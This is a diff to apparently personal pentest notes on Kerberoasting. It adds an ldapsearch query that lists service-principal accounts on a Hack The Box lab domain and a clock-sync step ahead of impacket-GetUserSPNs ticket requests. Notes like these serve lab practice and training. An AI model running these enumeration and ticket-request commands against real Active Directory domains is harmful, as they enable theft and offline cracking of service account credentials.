@@ -27,9 +27,16 @@ Using Rubeus
 ```PowerShell
 impacket-GetUserSPNs -dc-ip <dcip> domain.local/username
 ```
-  
+```bash
+ldapsearch -x -b "DC=certified,DC=htb" -s sub "(&(objectClass=user)(servicePrincipalName=*))" -H ldap://10.129.229.25 | grep -i samaccountname: | cut -f 2 -d " "
+```
 ## Exploit
 ---
+Make sure you're time is synced with remote host
+```bash
+sudo timedatectl set-ntp off
+sudo rdate -n <targetDC>
+```
 **From Linux**
 ```PowerShell
 impacket-GetUserSPNs -dc-ip <dcip> domain.local/username -request
